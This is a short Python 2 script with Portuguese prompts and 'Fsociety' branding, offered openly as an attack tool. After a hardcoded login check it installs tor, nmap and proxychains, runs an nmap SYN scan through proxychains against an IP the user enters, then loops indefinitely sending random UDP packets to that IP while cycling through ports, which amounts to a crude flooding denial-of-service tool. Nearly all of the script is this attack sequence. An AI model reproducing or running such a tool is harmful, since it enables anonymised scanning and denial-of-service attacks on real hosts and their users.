import time
import socket
import os
import random
##############################
login = 'Fsociety'
senha = '*****'
##############################

n1 = raw_input('login : ')
n2 = raw_input('senha : ')

if(login==n1):
        if(senha==n2):

                

                
#socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1490)

#system

                os.system('clear')
                os.system('figlet FSOCIETY!!!')
                print 'iremos instalar o tor e o nmap e o proxychains'
                time.sleep(2)
                print 'INSTALANDO TOR'
                os.system('apt install tor -y')
                os.system('clear')
                print 'INSTALANDO NMAP'
                os.system('apt install nmap')
                os.system('clear')
                print 'INSTALANDO PROXYCHAINS'
                os.system('apt install proxychains4')
                ip = raw_input('adicione o \033[1;41mIP : \033[0;0m  ')
                os.system('service tor start')
                os.system('service tor status')
                time.sleep(2)

                os.system('clear')
                os.system('proxychains4 nmap -sS %s'%(ip)) 

                port = input('adicione a Porta : ')

                os.system('clear')
                os.system('figlet INICIANDO ATAQUE ')
                time.sleep(2)
                sent = 0
                while True:
                        sock.sendto(bytes, (ip,port))
                        sent = sent + 1
                        port = port + 1
                        time.sleep(1)
                        print '\033[1;92m enviando pacotes para %s'%ip
                        if port == 65534:
                                port = 1
else:
        print 'senha ou usuario incorreto'
        print 'tente novamente'
        time.sleep(1)
        os.system('clear')

